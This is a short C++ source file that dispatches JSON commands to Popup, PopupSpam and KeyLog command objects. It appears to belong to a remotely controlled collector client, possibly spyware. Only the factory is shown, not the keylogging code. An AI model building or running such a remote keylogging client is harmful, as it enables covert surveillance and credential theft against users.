#include "Commands/CommandFactory.h"
#include "Commands/PopupCommand.h"
#include "Commands/KeyLogCommand.h"
using namespace xp_collector;

std::unique_ptr<BasicCommand> CommandFactory::create(const json& command)
{
	const auto command_id = command["command_id"];
	const auto command_type = ct_from_string(command["command_type"]);
	auto basic = std::make_unique<BasicCommand>(command_id, command_type);
	switch (basic->get_command_type()) {
	case CommandType::Popup:
	case CommandType::PopupSpam:
		return std::make_unique<PopupCommand>(command_id, command_type, command["parameters"]["message"]);
	case CommandType::KeyLog:
		return std::make_unique<KeyLogCommand>(command_id, command_type, command["parameters"]["duration"]);
	default:
		return std::move(basic);
	}
}
